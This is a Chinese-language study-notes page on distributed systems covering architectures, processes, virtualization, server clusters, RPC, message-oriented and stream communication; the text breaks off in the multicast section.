<p>以<strong>虚拟组织</strong>的方式，把来自不同计算机组织的资源集中起来，是一组人或机构协调工作。属于同一虚拟组织的人，具有访问提供给该组织的资源的权限。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451740.png" alt="网格计算系统的分层体系结构"></p>
<p><strong>光纤层</strong>：在特定站点提供对局部资源的接口。这些接口都进行了定制，以允许在某个虚拟组织中实现资源共享。</p>
<p><strong>连接层</strong>：由通信协议组成，用于支持网格事务处理，延伸多个资源的使用。例如，用于在资源之间传输数据或从远程地点访问资源的协议。另外，连接层还有安全协议，用于进行用户和资源的认证。</p>
<p><strong>资源层</strong>：负责管理单个资源。它使用由连接层提供的功能，直接调用对光线层可用的接口。</p>
<p><strong>汇集层</strong>：负责处理对多个资源的访问，通常由资源分派、把任务分配和调度到多资源以及数据复制等服务组成。连接层和资源层由相对较小、较标准的协议集组成，而汇集层由很多用于不同目的的不同协议组成。</p>
<p><strong>应用层</strong>：由应用程序组成。</p>
<h3 id="分布式信息系统"><a href="#分布式信息系统" class="headerlink" title="分布式信息系统"></a>分布式信息系统</h3><h3 id="分布式普适系统"><a href="#分布式普适系统" class="headerlink" title="分布式普适系统"></a>分布式普适系统</h3><h1 id="Chapter-2-体系结构"><a href="#Chapter-2-体系结构" class="headerlink" title="Chapter 2 体系结构"></a>Chapter 2 体系结构</h1><h2 id="体系结构的样式"><a href="#体系结构的样式" class="headerlink" title="体系结构的样式"></a>体系结构的样式</h2><p>根据组件、组件之间相互的连接方式、组件之间的数据交换以及这些元素如何集成到一个系统中来定义。</p>
<ul>
<li><strong>组件Component</strong>：一个模块单元，可以提供良好定义接口，在其环境中是可替换的。</li>
<li><strong>链接器Connector</strong>：在组件之间传递通信、使组件相互协调和协作。</li>
</ul>
<p>根据组件和连接器的使用，划分成<strong>不同体系结构</strong>：</p>
<ol>
<li><p>分层体系结构</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451741.png" alt="分层体系结构样式"></p>
<p>组件组成了不同的层，其中Li层中的组员可以调用下面的层Li−1。</p>
</li>
<li><p>基于对象的体系结构</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451742.png" alt="对象体系结构样式"></p>
<p>每个对象都对应一个组件，这些组件是通过(远程)过程调用机制来连接的。</p>
</li>
<li><p>以数据为中心的体系结构</p>
<p>通过一个公用(被动或主动的)仓库进行通信。</p>
</li>
<li><p>基于事件的体系结构</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451743.png" alt="基于事件的体系结构样式"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451744.png" alt="基于共享数据空间的体系结构样式"></p>
<p>通过事件的传播来通信。</p>
</li>
</ol>
<h2 id="系统体系结构"><a href="#系统体系结构" class="headerlink" title="系统体系结构"></a>系统体系结构</h2><h3 id="集中式体系结构"><a href="#集中式体系结构" class="headerlink" title="集中式体系结构"></a>集中式体系结构</h3><p><strong>客户-服务器</strong>的交互方式，又被称为<strong>请求-回复</strong>行为。</p>
<p><strong>幂等操作</strong>：如果某个操作可以重复多次而无害处，那么称它是<strong>幂等</strong>的。</p>
<h4 id="应用分层"><a href="#应用分层" class="headerlink" title="应用分层"></a>应用分层</h4><p><strong>客户-服务器</strong>模型分为三层：</p>
<ol>
<li>用户接口层，用于与用户交互；</li>
<li>处理层，包含应用程序；</li>
<li>数据层，管理要使用的实际数据。</li>
</ol>
<h4 id="多层体系结构"><a href="#多层体系结构" class="headerlink" title="多层体系结构"></a>多层体系结构</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451745.png" alt="各种客户-服务器组织结构"></p>
<h3 id="非集中式体系结构"><a href="#非集中式体系结构" class="headerlink" title="非集中式体系结构"></a>非集中式体系结构</h3><h4 id="结构化的点对点体系结构"><a href="#结构化的点对点体系结构" class="headerlink" title="结构化的点对点体系结构"></a>结构化的点对点体系结构</h4><p><strong>点对点</strong>体系结构：在结构化的点对点体系机构中，覆盖网络是一个确定性的过程来构成的。这个使用最多的进程是通过一个<strong>分布式哈希表</strong>来组织进程的。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451746.png" alt="Chord系统中，从数据项到结点的映射"></p>
<h4 id="非结构化的点对点体系结构"><a href="#非结构化的点对点体系结构" class="headerlink" title="非结构化的点对点体系结构"></a>非结构化的点对点体系结构</h4><p>很多非结构化的点对点系统的一个目标就是构造一个类似于<strong>随机图</strong>的覆盖网络。</p>
<h4 id="超级对等体"><a href="#超级对等体" class="headerlink" title="超级对等体"></a>超级对等体</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451747.png" alt="超级对等体网络中结点的分层组织结构"></p>
<p>能维护一个索引或者充当一个代理程序的结点称为<strong>超级对等体</strong>，控制管理多个常规对等体。每个常规对等体作为一个客户连接到超级对等体。</p>
<h3 id="混合体系结构"><a href="#混合体系结构" class="headerlink" title="混合体系结构"></a>混合体系结构</h3><h4 id="边界服务器系统"><a href="#边界服务器系统" class="headerlink" title="边界服务器系统"></a>边界服务器系统</h4><p>这种系统部署在因特网中，服务器放置在网络的“边界”。这种边界是由企业网络和实际的因特网之间的分界线形成的。例如，因特网服务提供商。家庭终端用户通过ISP连接到因特网，该ISP就可以认为是因特网的边界。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451748.png" alt="把因特网看做是由一系列便捷服务器组成的"></p>
<h4 id="协作分布式系统"><a href="#协作分布式系统" class="headerlink" title="协作分布式系统"></a>协作分布式系统</h4><p><strong>混合结构</strong>主要部署在协作式分布式系统中。在很多重要的系统中，主要问题是先启动起来，因为经常会部署一个传递的客户-服务器结构。一旦某个结点要加入系统，就可以使用完全非集中式的组织结构，用于协作。</p>
<p><strong>BitTorrent</strong>是一个点对点的文件下载系统。基本思想是，当一个终端用户要查找某个文件时，他可以从其他用户那里下载文件块，直到所下载的文件块能够组装成完整的文件为止。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451749.png" alt="img"></p>
<h2 id="分布式系统的自我管理"><a href="#分布式系统的自我管理" class="headerlink" title="分布式系统的自我管理"></a>分布式系统的自我管理</h2><p><strong>自治计算</strong>：以高级反馈控制系统的形式来组织分布式系统，允许自动自适应变换。也叫做<strong>自主</strong>系统。</p>
<p>自适应的多样性：</p>
<ul>
<li>自我管理</li>
<li>自我恢复</li>
<li>自我配置</li>
<li>自我优化</li>
<li>等</li>
</ul>
<h3 id="反馈控制模型"><a href="#反馈控制模型" class="headerlink" title="反馈控制模型"></a>反馈控制模型</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451750.png" alt="img"></p>
<p>反馈控制系统的核心由需要管理的组件形成。这些组件能通过可控输入参数驱动，受干扰或噪声输入的影响。</p>
<p>系统本身需要被监视，因此需要对系统各个方面进行测量。但是实际测量很难做到，就需要一个逻辑<strong>尺度预测组件</strong>。</p>
<p>控制循环的核心部分是反馈分析组件，分析上述测量值，并把它们与参考值进行比较。包含了决定自适应的各种算法。</p>
<hr>
<h1 id="Chapter-3-进程"><a href="#Chapter-3-进程" class="headerlink" title="Chapter 3 进程"></a>Chapter 3 进程</h1><h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p><strong>为什么</strong>要使用线程？</p>
<p>虽然进程构成了分布式系统中的基本组成单元，但是实践表明，操作系统提供的用于构建分布式系统的进程在粒度上还是太大了。而就粒度而言，将每个进程细分为若干控制线程的形式则更加合适，可以使构建分布式应用程序变得更加方便，获得更好的性能。</p>
<p>线程与进程<strong>不同</strong>之处？</p>
<ul>
<li>线程不会以性能降低为代价，换取高度的并发透明性。</li>
<li>线程上下文一般只包含存储在寄存器和存储器中的尽可能少的信息，仅仅用于执行一系列指令。</li>
</ul>
<h3 id="分布式系统中的线程"><a href="#分布式系统中的线程" class="headerlink" title="分布式系统中的线程"></a>分布式系统中的线程</h3><h4 id="多线程客户端"><a href="#多线程客户端" class="headerlink" title="多线程客户端"></a>多线程客户端</h4><p>多线程客户端最大的问题是如何隐藏网络延时。常规方法是启动网络通信线程后，立即进行其他工作。</p>
<h4 id="多线程服务器"><a href="#多线程服务器" class="headerlink" title="多线程服务器"></a>多线程服务器</h4><p>在服务器上使用多线程技术有很多好处：</p>
<ol>
<li><p>可以提升性能</p>
<ul>
<li>启动一个线程处理请求比启动进程开销更小</li>
<li>可以隐藏网络延时。当有请求到来时，也可以做其他工作。</li>
</ul>
</li>
<li><p>结构更优</p>
<p>多线程程序的结构会更简单。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451751.png" alt="以分发器/工作者模型组织起来的多线程服务器"></p>
<p>上图中，<strong>分发器线程</strong>读取文件操作请求，随后选择一个空闲的<strong>工作者线程</strong>来处理请求。</p>
</li>
</ol>
<h2 id="虚拟化"><a href="#虚拟化" class="headerlink" title="虚拟化"></a>虚拟化</h2><blockquote>
<p>虚拟化：把一样东西看成另一个东西</p>
</blockquote>
<ul>
<li>多虚一，多个资源虚拟整合成一个资源；</li>
<li>一虚多，把一个资源虚拟成多个，供多用户使用，可弥补运营成本；</li>
<li>做隔离，底层和上层之间不可见，<strong>便于移植</strong>；早期用于程序迁移。</li>
</ul>
<h3 id="虚拟机体系结构"><a href="#虚拟机体系结构" class="headerlink" title="虚拟机体系结构"></a>虚拟机体系结构</h3><p>计算机系统通常在4个不同层次提供4个不同的界面：</p>
<ol>
<li><p>由<strong>机器指令</strong>组成，任何程序都可激起的，介于硬件软件之间的界面；</p>
<p>Interface between hardware and software, non-privileged.</p>
</li>
<li><p>由<strong>机器指令</strong>组成，只有特权程序(e.g 操作系统)才可激起的界面；</p>
<p>Interface between hardware and software, privileged.</p>
</li>
<li><p>有操作系统提供的<strong>系统调用</strong>组成的界面；</p>
<p>System calls.</p>
</li>
<li><p>由库调用组成的界面，通常形成了所谓的**应用程序编程接口(API)**。</p>
<p>Libraries functions.</p>
</li>
</ol>
<p><strong>而虚拟化的实质就是模仿这些界面的行为。</strong></p>
<ul>
<li>指令集虚拟化的代价很高；</li>
<li>硬件虚拟化，性能损失不大，是虚拟化的主流。</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451752.png" alt="4个不同层次的界面"></p>
<h3 id="虚拟机的两种方式"><a href="#虚拟机的两种方式" class="headerlink" title="虚拟机的两种方式"></a>虚拟机的两种方式</h3><ol>
<li><p>构建一个运行时（runtime）系统，实质上提供了一套抽象指令集来执行程序。例如Java虚拟机，将指令进行翻译，使用库虚拟化；还有使用Windows操作系统模拟Linux，是OS虚拟化。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451753.png" alt="img"></p>
</li>
<li><p>使用<strong>虚拟机监视器（VMM）</strong>这一层，虚拟机监视器完全屏蔽硬件，但提供一个同样指令集（或其他硬件）的界面。这个界面可以同时提供给多个程序，可以有多个不同的操作系统独立并发地运行在同一平台。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451754.png" alt="虚拟机监视器"></p>
</li>
</ol>
<h3 id="虚拟化-v-s-容器"><a href="#虚拟化-v-s-容器" class="headerlink" title="虚拟化 v.s. 容器"></a>虚拟化 v.s. 容器</h3><h4 id="虚拟化：OpenStack"><a href="#虚拟化：OpenStack" class="headerlink" title="虚拟化：OpenStack"></a>虚拟化：OpenStack</h4><p>使用OpenStack做虚拟化时，它可以将操作系统都一并打包好，各个虚拟机之间完全隔离，互不干涉。</p>
<p>层次结构：</p>
<ul>
<li>最顶层应用</li>
<li>操作系统(任意的操作系统)</li>
<li>OpenStack</li>
<li>底层硬件</li>
</ul>
<h4 id="容器：Docker"><a href="#容器：Docker" class="headerlink" title="容器：Docker"></a>容器：Docker</h4><p>Docker是基于**进程容器(Process container)**的轻量级VM解决方案，用比虚拟机技术少很多的资源消耗实现了类似于虚拟机的对CPU、磁盘、网络的隔离。</p>
<p>层次结构：</p>
<ul>
<li>最顶层应用</li>
<li>Docker</li>
<li>操作系统(仅限Linux)</li>
<li>底层硬件</li>
</ul>
<h4 id="OpenStack与Docker的区别"><a href="#OpenStack与Docker的区别" class="headerlink" title="OpenStack与Docker的区别"></a>OpenStack与Docker的区别</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451755.png" alt="img"></p>
<h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><h3 id="客户端软件与分布透明性"><a href="#客户端软件与分布透明性" class="headerlink" title="客户端软件与分布透明性"></a>客户端软件与分布透明性</h3><p>一个带有副本服务器的分布式系统，可以通过将调用请求转发给每一个服务器的副本来达到复制透明性。客户代理将会透明地偶素即所有对象的响应，并且只向客户应用程序送回一个返回值。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451756.png" alt="img"></p>
<h2 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h2><ul>
<li><p><strong>迭代服务器</strong></p>
<p>自己处理请求，并且在必要的情况下将响应返回给发出请求的客户。</p>
<p>一次只能处理<strong>一个</strong>客户端请求，而并发服务器不同。</p>
</li>
<li><p><strong>并发服务器</strong></p>
<p>并不自己处理请求，而是将请求传递给某个独立线程或者其他进程来处理，自身立即返回并等待下一个输入的请求。</p>
</li>
<li><p><strong>超级服务器</strong></p>
<p>负责监听所有与这些服务关联的端点，当收到请求的时候，它派生出一个进程已对该请求进行进一步处理，这个派生出的进程在处理完毕后将会自动退出运行。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451757.png" alt="img"></p>
</li>
<li><p><strong>状态无关服务器</strong></p>
<p>不保存器客户的状态信息，而且也不将自身的状态变化告知任何客户。</p>
<ul>
<li>不记录文件是否已经打开(只在访问后再次关闭文件)；</li>
<li>不一定会使得客户的缓存变无效；</li>
<li>不跟踪客户行为。</li>
</ul>
<p>后果：</p>
<ul>
<li>客户端与服务器端完全独立；</li>
<li>非<strong>无状态服务器</strong>的情况下，由于客户或者服务器端某一方发生崩溃，从而导致双方状态不一致。而在无状态服务器中，因为是无状态的，这种状态不一致的情况大大减小了；</li>
<li>因为某些原因性能可能会有所降低，例如服务器无法预测客户的行为(比如预取文件块)。</li>
</ul>
</li>
<li><p>状态相关服务器</p>
<p>跟踪客户的状态，一直保留客户端的信息直到被显式删除，包括：</p>
<ul>
<li>记录文件已被打开，以便可以进行预取；</li>
<li>知道客户端缓存了哪些数据，并允许客户端保留共享数据的本地副本</li>
</ul>
<p>如果允许客户端保留本地副本，则可以提升读写操作的性能。</p>
<p>缺陷：</p>
<ul>
<li>如果服务器崩溃，那么必须将自身的整个状态恢复到崩溃之前。但是如果采用状态无关设计，就不需要采取任何特殊措施来使崩溃的服务器恢复。</li>
</ul>
</li>
<li><p>Cookies</p>
<p>Cookies是一小段数据，其中包含有对服务器有用的针对特定客户的信息。浏览器本身永远不会执行cookie，它只对cookie进行存储。</p>
<p>Cookies可用于将当前客户端操作与先前操作相关联，也可用于状态的存储。</p>
</li>
</ul>
<h3 id="服务器集群"><a href="#服务器集群" class="headerlink" title="服务器集群"></a>服务器集群</h3><h4 id="常见的组织"><a href="#常见的组织" class="headerlink" title="常见的组织"></a>常见的组织</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451758.png" alt="img"></p>
<p>服务器集群逻辑上由三层组成。</p>
<ul>
<li>第一层：（逻辑上的）交换机，由它分配客户请求给服务器；</li>
<li>第二层：应用计算服务器，是专用于提供计算能力的服务器；</li>
<li>第三层：文件和数据库服务器，是分布式文件系统或分布式数据库系统。</li>
</ul>
<p>交换机形成了集群入口，提供了唯一的网络地址。</p>
<p>一种标准的存取服务器集群的方式是建立一个TCP连接，在这之上应用级别的请求可作为一个会话的一部分来发送，撤除连接可结束会话。在传输层交换机的情况下，交换机接受到来的TCP连接请求，转发这些请求给一台服务器。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451759.png" alt="img"></p>
<p>当交换机收到一个TCP连接请求时，他就找到处理这个请求的最佳服务器，并转发这个请求包给这个服务器。服务器反过来会发送一个应答给请求的客户，但把交换机的IP地址插入到承载TCP数据段的IP包头的原地址域。(看上去是服务器欺骗客户自己是交换机，但是客户等待的是交换机的应答，而不是某个不知名的服务器，所以这种欺骗是必须的。从而可以看出，实现TCP转发需要操作系统级别的修改)</p>
<h4 id="分布式服务器"><a href="#分布式服务器" class="headerlink" title="分布式服务器"></a>分布式服务器</h4><blockquote>
<p>分布式服务器指可动态变化的一个机器群，它的访问点也可以变化，但对外却表现为一强有力的单台机器。</p>
</blockquote>
<p>如何在这样的系统中实现一个稳定访问点？</p>
<p>主要思想是利用可用的网络服务，比如IP版本6的移动支持(MIPv6)。在MIPv6中，一个移动结点假设有一个<strong>宿主网络</strong>，通常待在这个网络中，并有稳定的地址，称为<strong>宿主地址</strong>。</p>
<p>宿主网络有一个特别的路由器，称为<strong>宿主代理</strong>。当移动节点附着到一个外部网络时，它会收到一临时<strong>需要的地址</strong>，其他结点可以发送网络包给这个地址。这个临时地址通告给宿主代理，它随后就可以转发送给移动节点的网络包到这个临时地址。</p>
<p>在分布式服务器的情况下，给集群分配一个唯一的联系地址（服务器生命周期内和外界通信的地址），任何时候分布式服务器都有一节点作为联系地址的访问点，这个角色可以容易被另一结点取代。访问点在分布式服务器所在网络的宿主代理注册自己的地址为临时地址。这是所有的网络包都会导向访问点，他然后分配请求给当前参与分布式服务器的结点。若访问点失效，一个简单容错机制启动，另一个访问点会选出并注册一个新的临时地址。</p>
<p>这个配置会使得宿主代理和访问点称为瓶颈，因为这样所有的流量都要流经这两台机器，可以使用MIPv6的<strong>路径优化</strong>（见下图）：</p>
<ol>
<li>客户知道服务器的地址是HA，把请求传给HA；</li>
<li>服务器的宿主代理把请求转发给当前临时地址CA；</li>
<li>宿主代理转发CA给客户；</li>
<li>客户把(HA,CA)存储在本地，之后通信直接送给CA。</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451760.png" alt="img"></p>
<h2 id="代码迁移"><a href="#代码迁移" class="headerlink" title="代码迁移"></a>代码迁移</h2><p>代码迁移会带来与本地资源使用相关的问题，因为迁移时要求资源同时迁移，并且在目标机器上重新绑定到本地资源，或者使用系统范围的网络引用。</p>
<p>另一个问题是，在迁移代码时要考虑异构性。可以使用虚拟机来处理异构性。</p>
<h3 id="代码迁移模型"><a href="#代码迁移模型" class="headerlink" title="代码迁移模型"></a>代码迁移模型</h3><p>进程包含如下三段：</p>
<ul>
<li>代码段，包含构成正在运行的程序的所有指令；</li>
<li>资源段，包含指向进程需要的外部资源（文件、打印机、设备等）的指针；</li>
<li>执行段，用来存储进程的当期那执行状态量（包括私有数据、栈、程序计数器等）。</li>
</ul>
<p><strong>弱可移动性</strong>：</p>
<p>只传输代码段以及某些初始化数据。传输过来的程序总是从预先定义的几个位置之一开始执行。</p>
<p><strong>强可移动性</strong>：</p>
<p>可以先停止运行中的进程，然后将它移到另一台机器上去，再从刚才中断的位置继续执行。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451761.png" alt="img"></p>
<h1 id="Chapter-4-通信-Communication"><a href="#Chapter-4-通信-Communication" class="headerlink" title="Chapter 4 通信 - Communication"></a>Chapter 4 通信 - Communication</h1><p><strong>进程间通信 - Interprocess Communication</strong></p>
<blockquote>
<p>进程间通信是每个分布式系统的核心。</p>
</blockquote>
<p>但是，不同机器的进程想相互交流是很困难的。 </p>
<p><strong>解决方案：</strong></p>
<p>目前主要有四种方法用于进程间通信 - IPC models:</p>
<ul>
<li>RPC</li>
<li>RMI</li>
<li>MOM</li>
<li>Streams</li>
</ul>
<h2 id="分层协议-Layered-Protocols"><a href="#分层协议-Layered-Protocols" class="headerlink" title="分层协议 - Layered Protocols"></a>分层协议 - Layered Protocols</h2><p>分层协议可以解决通信的问题</p>
<h3 id="两大类协议"><a href="#两大类协议" class="headerlink" title="两大类协议"></a>两大类协议</h3><ul>
<li><p><strong>面向连接</strong></p>
<p>消息发送与接收双方需要先建立连接，再传输数据；</p>
</li>
<li><p><strong>面向无连接</strong></p>
<p>直接传数据</p>
</li>
</ul>
<h3 id="中间件协议"><a href="#中间件协议" class="headerlink" title="中间件协议"></a>中间件协议</h3><p>中间件是一种应用程序，逻辑上位于应用层中。</p>
<ul>
<li>中间件通信协议支持高层通信服务；</li>
<li>对实时数据传输进行设定并使其保持同步的协议；</li>
<li>还提供可靠的多播服务。</li>
</ul>
<h2 id="远程过程调用-Remote-Procedure-Call"><a href="#远程过程调用-Remote-Procedure-Call" class="headerlink" title="远程过程调用 - Remote Procedure Call"></a>远程过程调用 - Remote Procedure Call</h2><p>RPC就是一个机器调用位于其他机器上的进程。</p>
<p>A机器的进程调用B机器的进程：</p>
<ol>
<li>A将本地调用进程挂起；</li>
<li>A通过参数将信息传递给B；</li>
<li>B执行被调用进程；</li>
<li>B执行结束将信息传回给A。</li>
</ol>
<p>一般说的RPC就是同步RPC，如上面的流程所示，机器A的调用进程：</p>
<ul>
<li>无需保护现场；</li>
<li>在结果返回之前会阻塞的。</li>
</ul>
<h3 id="基本的RPC操作-Basic-RPC-Operation"><a href="#基本的RPC操作-Basic-RPC-Operation" class="headerlink" title="基本的RPC操作 - Basic RPC Operation"></a>基本的RPC操作 - Basic RPC Operation</h3><p>RPC操作背后隐含的思想是尽量是<strong>远程过程调用具有与本地调用相同的形式</strong>。</p>
<p>将客户过程对客户存根发出的本地调用转换成对服务器过程的本地调用，而客户和服务器都不会意识到有中间步骤的存在。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451762.png" alt="img"></p>
<p>使用socket进行通信，把socket通信隐藏到底层，从而实现透明性。</p>
<p><strong>RPC的步骤</strong>：</p>
<p><strong>总结一下就是</strong>：</p>
<ol>
<li><p>发送：</p>
<p>客户过程 -&gt; 客户存根 -&gt; 客户操作系统 -&gt; 服务器操作系统 -&gt; 服务器存根 -&gt; 服务器进程</p>
</li>
<li><p>返回：从右向左就是了。</p>
</li>
</ol>
<p><strong>具体</strong>：</p>
<ol>
<li>客户过程以正常的方式调用客户存根；</li>
<li>客户存根生成一个消息，然后调用本地操作系统；</li>
<li>客户端操作系统将消息发送给远程操作系统；</li>
<li>远程操作系统将消息交给服务器存根；</li>
<li>服务器存根将参数提取出来，然后调用服务器；</li>
<li>服务器执行要求的操作，操作完成后将结果返回给服务器存根；</li>
<li>服务器存根将结果打包成一个消息，然后调用本地操作系统；</li>
<li>服务器操作系统将含有结果的消息发送回客户端操作系统；</li>
<li>客户端操作系统将消息交给客户存根；</li>
<li>客户存根将结果从消息中提取出来，返回给调用他的客户过程。</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451763.png" alt="img"></p>
<h3 id="参数传递-Parameter-Passing"><a href="#参数传递-Parameter-Passing" class="headerlink" title="参数传递 - Parameter Passing"></a>参数传递 - Parameter Passing</h3><p>完整定义了RPC协议后，需要实现客户存根和服务器存根，不同点仅仅在于面向应用程序的接口。</p>
<p>接口通常使用<strong>IDL</strong>(接口定义语言)，用IDL说明的接口可以与适当的编译时接口或者运行时接口一起编译到客户存根过程和服务器存根中。</p>
<h3 id="异步RPC-Variations"><a href="#异步RPC-Variations" class="headerlink" title="异步RPC - Variations"></a>异步RPC - Variations</h3><p><strong>异步RPC中：</strong></p>
<ul>
<li>客户发出RPC请求，接受到服务器的确认信息后，不会阻塞，继续向下执行；</li>
<li>服务器在接受到RPC请求后立即向客户送回应答，之后再调用客户请求的过程。</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451764.png" alt="img"></p>
<p>异步RPC效率高，但是难编程。</p>
<p><strong>延迟的同步RPC</strong>：</p>
<p>就是两个异步RPC结合起来。</p>
<p>远程服务器在处理请求时，客户同时做一些其他的事情。当服务器处理好请求时，返回结果去中断客户，服务器一端变成发送端，实现第二个异步RPC。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451765.png" alt="img"></p>
<h2 id="面向消息的通信-Message-oriented-Communication"><a href="#面向消息的通信-Message-oriented-Communication" class="headerlink" title="面向消息的通信 - Message-oriented Communication"></a>面向消息的通信 - Message-oriented Communication</h2><h3 id="套接字"><a href="#套接字" class="headerlink" title="套接字"></a>套接字</h3><p>一种通信端点。如果应用程序要通过底层网络发送某些数据，可以把这些数据写入套接字，然后从套接字读出数据。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451766.png" alt="pastedGraphic.png"></p>
<p>服务器一般执行前4个原语，一般按照图中顺序执行。调用套接字原语的时候，调用者创建一个新的通信端点，用于某种特定的传输协议的。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451767.png" alt="img"></p>
<h3 id="消息传递接口-MPI"><a href="#消息传递接口-MPI" class="headerlink" title="消息传递接口 MPI"></a>消息传递接口 MPI</h3><p><strong>MPI</strong>的先进之处：</p>
<p>程序的硬件独立性需要导致MPI的出台。MPI是为并行应用程序设计的，是为瞬时通信量身定做的。它直接使用的是底层网络。</p>
<p>MPI是并行计算，一般运行于集群中。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451769.png" alt="img"></p>
<h3 id="消息队列系统"><a href="#消息队列系统" class="headerlink" title="消息队列系统"></a>消息队列系统</h3><p>面向消息的中间件服务。为持久异步通信提供多种支持。<strong>本质</strong>是，提供消息的中介存储能力，这样就不需要消息发送方和接收方在消息传输中都保持激活状态。与套接字和MPI的重要<strong>区别</strong>在于，它的设计目标一般是支持那些时间要求较为宽松的消息传输，不适合几秒甚至几微秒内要完成的传输。</p>
<h2 id="面向流的通信-Stream-oriented-Communication"><a href="#面向流的通信-Stream-oriented-Communication" class="headerlink" title="面向流的通信 - Stream-oriented Communication"></a>面向流的通信 - Stream-oriented Communication</h2><h3 id="流的定义"><a href="#流的定义" class="headerlink" title="流的定义"></a>流的定义</h3><blockquote>
<p>A (continuous) data stream is a connection oriented communication facility that supports isochronous data transmission</p>
</blockquote>
<ul>
<li><p><strong>简单流</strong>：</p>
<p>只包含单个数据序列；</p>
</li>
<li><p><strong>复杂流</strong>：</p>
<p>简单流的组合</p>
</li>
</ul>
<h3 id="传输模式"><a href="#传输模式" class="headerlink" title="传输模式"></a>传输模式</h3><ul>
<li><p><strong>异步传输模式</strong>：</p>
<p>流中的数据项是逐个传输的，但是对某一项在何时进行传输并没有进一步的限制。这是采用离散数据流时常见的情况。比如文件的传输。</p>
</li>
<li><p><strong>同步传输模式</strong>：</p>
<p>数据流中每一个单元都定义了一个端到端的最大延迟时间，容许延迟。数据单元的传输时间是否远远小于最大允许延迟并不重要。</p>
</li>
<li><p><strong>等时传输模式</strong>：</p>
<p>数据单元必须按时传输，端到端的延迟时间同时有上限和下限。这个上、下限也称为边界延迟抖动。在视频和音频方面很常用，比如音视频的同步(对口型)。</p>
<p>流媒体就属于这个类，既有最大端到端延迟限制，又有最小的端到端延迟限制。</p>
</li>
</ul>
<h3 id="流与服务质量"><a href="#流与服务质量" class="headerlink" title="流与服务质量"></a>流与服务质量</h3><h4 id="QoS服务质量："><a href="#QoS服务质量：" class="headerlink" title="QoS服务质量："></a>QoS服务质量：</h4><ol>
<li>数据传输所要求的比特率；</li>
<li>创建会话的最大延时(比如应用程序何时可以开始发送数据)；</li>
<li>端到端的最大延时；</li>
<li>最大延时抖动；</li>
<li>最大往返延时。</li>
</ol>
<h4 id="QoS保证："><a href="#QoS保证：" class="headerlink" title="QoS保证："></a>QoS保证：</h4><ul>
<li><p>使用 buffer 来减少 jitter</p>
<p>当数据包有不同的延时，接收方先把它们存储在缓冲区，当总是有足够的数据包进入缓冲区时，接收方就可以以固定的速率把数据包传递给应用程序。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451770.png" alt="img"></p>
</li>
<li><p>针对丢包情况，interleaving，若没有交错机制，丢包时会把连续的几帧一起丢掉，视觉影响较大；而使用交错机制，会交叉丢包。</p>
<p>如在传送音视频时，采用交错传输，丢失的帧分布较广，这样丢失的就不是一大段而是零散的帧，对于音视频的播放影响就较小。但是这样需要更大的缓冲区，因此程序的开始延时更高。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451771.png" alt="img"></p>
</li>
</ul>
<h3 id="流同步"><a href="#流同步" class="headerlink" title="流同步"></a>流同步</h3><p><strong>音视频流同步</strong></p>
<p>采用音视频的编解码协议：<strong>H264协议</strong></p>
<h2 id="多播通信-Communication"><a href="#多播通信-Communication" class="headerlink" title="多播通信 - Communication"></a>多播通信 - Communication</h2><h3 id="Gossip-Based-Data-Dissemination"><a href="#Gossip-Based-Data-Dissemination" class="headerlink" title="Gossip-Based Data Dissemination"></a>Gossip-Based Data Dissemination</h3><p>属于p2p系统的多播。</p>
<p>应用在自主网或是p2p，就是没有服务器的那一类网。</p>
<h3 id="几种多播"><a href="#几种多播" class="headerlink" title="几种多播"></a>几种多播</h3><ul>
<li><p>全序多播 Total order</p>
</li>
